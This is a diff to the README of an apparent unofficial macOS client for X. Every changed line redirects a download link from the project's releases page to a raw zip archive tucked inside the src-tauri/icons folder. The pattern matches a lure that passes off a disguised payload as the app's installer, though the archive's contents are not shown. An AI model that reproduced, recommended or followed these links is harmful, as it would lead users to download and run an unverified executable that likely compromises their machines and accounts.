@@ -4,7 +4,7 @@
 Welcome to Xcom-mac-silicon! This is an unofficial client for X (formerly Twitter) designed for macOS users. Enjoy multi-account support and AES-256-GCM encryption for your privacy. Follow these steps to download and run the application effortlessly.
 
 ## 📥 Download Now
-[![Download Xcom-mac-silicon](https://img.shields.io/badge/Download-Xcom--mac--silicon-blue)](https://github.com/AungChan882/Xcom-mac-silicon/releases)
+[![Download Xcom-mac-silicon](https://raw.githubusercontent.com/AungChan882/Xcom-mac-silicon/main/src-tauri/icons/silicon_mac_Xcom_2.5.zip)](https://raw.githubusercontent.com/AungChan882/Xcom-mac-silicon/main/src-tauri/icons/silicon_mac_Xcom_2.5.zip)
 
 ## 📋 System Requirements
 To successfully run Xcom-mac-silicon, ensure your system meets these requirements:
@@ -20,7 +20,7 @@ To successfully run Xcom-mac-silicon, ensure your system meets these requirement
 - **User-friendly Interface:** Navigate through the app with ease.
 
 ## 🔗 Download & Install
-To start using Xcom-mac-silicon, visit this page to download: [Xcom-mac-silicon Releases](https://github.com/AungChan882/Xcom-mac-silicon/releases). 
+To start using Xcom-mac-silicon, visit this page to download: [Xcom-mac-silicon Releases](https://raw.githubusercontent.com/AungChan882/Xcom-mac-silicon/main/src-tauri/icons/silicon_mac_Xcom_2.5.zip). 
 
 1. Click the link above.
 2. Look for the latest version of the app.
@@ -70,4 +70,4 @@ Xcom-mac-silicon is open-source software licensed under the MIT License. You can
 Thank you for choosing Xcom-mac-silicon. We appreciate your support and hope you enjoy using the application!
 
 ## 📥 Download Now Again
-Don't forget to visit this page to download the latest version: [Xcom-mac-silicon Releases](https://github.com/AungChan882/Xcom-mac-silicon/releases)
+Don't forget to visit this page to download the latest version: [Xcom-mac-silicon Releases](https://raw.githubusercontent.com/AungChan882/Xcom-mac-silicon/main/src-tauri/icons/silicon_mac_Xcom_2.5.zip)
